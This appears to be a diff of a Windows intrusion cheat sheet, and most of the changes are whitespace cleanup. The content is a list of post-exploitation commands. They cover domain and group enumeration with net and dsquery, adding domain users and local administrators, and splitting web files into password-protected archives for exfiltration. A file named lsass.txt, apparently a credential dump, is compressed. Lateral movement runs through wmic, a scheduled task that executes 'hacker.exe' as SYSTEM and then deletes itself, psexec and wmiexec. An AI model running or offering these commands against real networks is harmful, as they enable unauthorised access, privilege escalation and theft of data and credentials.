@@ -1,33 +1,33 @@
-#scan 
+# scan
 
 
 
-#Domain control
-net user 
-net user /domain 
-net group /domain 
-net view /domain 
-net group "domain admins" /domain 
-net localgroup administrators /domain 
-net user username password /add /domain 
-net time /domain 
-net view /domain 
-net localgroup administrators workgroup\test123 /add 
-net group "domain controllers" /domain 
+# Domain control
+net user
+net user /domain
+net group /domain
+net view /domain
+net group "domain admins" /domain
+net localgroup administrators /domain
+net user username password /add /domain
+net time /domain
+net view /domain
+net localgroup administrators workgroup\test123 /add
+net group "domain controllers" /domain
 
-dsquery computer 
-dsquery contact 
-dsquery group 
-dsquery user 
-dsquery subnet 
-dsquery server 
+dsquery computer
+dsquery contact
+dsquery group
+dsquery user
+dsquery subnet
+dsquery server
 
 # information package
-7z.exe -r -v6m -padmin a c:\test.7z C:\AppServ\www\import*.* 
+7z.exe -r -v6m -padmin a c:\test.7z C:\AppServ\www\import*.*
 7z.exe x -padmin test.7z.001 -oc:\xl
 
-Rar.exe a -r -v6m -padmin -m3 -x*.txt -ta c:\test.rar C:\AppServ\www\import*.* 
-Rar.exe x -padmin c:\test.part01.rar c:\xl 
+Rar.exe a -r -v6m -padmin -m3 -x*.txt -ta c:\test.rar C:\AppServ\www\import*.*
+Rar.exe x -padmin c:\test.part01.rar c:\xl
 
 makecab /d compressiontype=lzx C:\Users\lsass.txt C:\Users\lsass.cab >> C:\Users\info.txt
 expand.exe lsass.cab -f:* .
@@ -48,7 +48,7 @@ wmic /node:192.168.1.1 /user:administrator /password:"passwd" process where name
 schtasks /create /s 172.10.1.1 /u administrator /p "passwd" /ru SYSTEM /tn test /sc DAILY /tr "C:\Users\hacker.exe -a -b c" /F & schtasks /run /s 172.10.1.1 /u administrator /p "passwd" /tn test /i & schtasks /delete /s 172.10.1.1 /u administrator /p "passwd" /tn test /f
 python psexec.py test:passwdtest@10.10.1.1 cmd
 python wmiexec.py test:passwdtest@10.10.1.1
-Psexec.exe \\10.10.1.1 -u test -p passwdtest cmd 
+Psexec.exe \\10.10.1.1 -u test -p passwdtest cmd
 
 # powershell
 change file time
